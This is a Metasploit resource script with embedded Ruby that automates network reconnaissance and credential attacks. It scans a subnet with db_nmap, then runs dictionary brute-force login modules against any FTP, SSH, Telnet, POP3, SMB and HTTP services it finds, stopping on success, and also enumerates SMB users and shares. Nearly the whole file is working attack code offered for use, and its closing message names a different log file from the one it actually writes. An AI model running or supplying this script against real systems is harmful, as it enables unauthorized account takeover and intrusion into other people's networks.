   <ruby>
      help = %Q|
        Description:
          This Metasploit RC file can be used to automate the exploitation process.
          In this example we are using db_nmap to populate msfdb database with hosts
          then it triggers msf auxiliary/scanners based on target open ports reported.
          this module probes for 21:22:23:80:110:445 remote TCP ports open.

        Execute in msfconsole:
          setg RHOSTS <hosts-separated-by-spaces>
          setg USERPASS_FILE <absoluct-path-to-dicionary.txt>
          resource <path-to-script>/brute_force.rc

        Author:
          r00t-3xp10it  <pedroubuntu10[at]gmail.com>
      |
      print_line(help)
      Rex::sleep(1.5)

      if (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
         run_single("setg RHOSTS 192.168.1.0/24")
      end
      if (framework.datastore['USERPASS_FILE'] == nil or framework.datastore['USERPASS_FILE'] == '')
         run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
      end

      run_single("db_nmap -sV -Pn -T4 -O -p 21,22,23,80,110,445 --script=smb-os-discovery.nse,http-headers.nse,ip-geolocation-geoplugin.nse --open #{framework.datastore['RHOSTS']}")
      run_single("spool /root/brute_force.log")
      run_single("services")
      print_good("Reading msfdb database for info.")
      xname = framework.db.hosts.map(&:os_name).join(' ')
      xhost = framework.db.hosts.map(&:address).join(' ')
      xport = framework.db.services.map(&:port).join(' ')
      print_status("Target systems detected: #{xname}")
      run_single("setg RHOSTS #{xhost}")
      Rex::sleep(2.0)

         if xhost.nil? or xhost == ''
              print_error("db_nmap scan did not find any alive connections.")
              print_error("please wait, cleaning recent configurations.")
              run_single("unsetg RHOSTS USERPASS_FILE")
              return nil
         elsif xport.nil? or xport == ''
              print_error("db_nmap did not find any 21:22:23:80:110:445 open ports.")
              print_error("please wait, cleaning recent configurations.")
              run_single("unsetg RHOSTS USERPASS_FILE")
              run_single("services -d")
              run_single("hosts -d")
              return nil
         end

         if xport =~ /21/i
              print_warning("Remote Target port: 21 ftp found")
              run_single("use auxiliary/scanner/ftp/ftp_version")
              run_single("exploit")
              run_single("use auxiliary/scanner/ftp/anonymous")
              run_single("set THREADS 35")
              run_single("exploit")
              run_single("use auxiliary/scanner/ftp/ftp_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BRUTEFORCE_SPEED 4")
              run_single("set THREADS 70")
              run_single("exploit")
         end

         if xport =~ /22/i
              print_warning("Remote Target port: 22 ssh found")
              run_single("use auxiliary/scanner/ssh/ssh_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 30")
              run_single("exploit")
         end

         if xport =~ /23/i
              print_warning("Remote Target port: 23 telnet found")
              run_single("use auxiliary/scanner/telnet/telnet_version")
              run_single("exploit")
              run_single("use auxiliary/scanner/telnet/telnet_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("exploit")
         end

         if xport =~ /110/i
              print_warning("Remote Target port: 110 pop3 found")
              run_single("use auxiliary/scanner/pop3/pop3_version")
              run_single("set THREADS 30")
              run_single("exploit")
              run_single("use auxiliary/scanner/pop3/pop3_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("exploit")
         end

         if xport =~ /445/i
              print_warning("Remote Target port: 445 smb found")
              run_single("use auxiliary/scanner/smb/smb_version")
              run_single("set THREADS 16")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_enumusers")
              run_single("set THREADS 16")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_enumshares")
              run_single("set THREADS 16")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("exploit")
         end

         if xport =~ /80/i
              print_warning("Remote Target port: 80 http found")
              run_single("use auxiliary/scanner/http/title")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/options")
              run_single("set THREADS 11")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/dir_scanner")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/http_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("exploit")
         end
      print_warning("please wait, Cleaning msfdb Database.")
      run_single("unsetg RHOSTS USERPASS_FILE")
      run_single("unset THREADS VERBOSE BRUTEFORCE_SPEED USERPASS_FILE STOP_ON_SUCCESS")
      run_single("services -d")
      run_single("hosts -d")
      print_warning("Logfile stored under: /root/mysql_brute.log")
   </ruby>
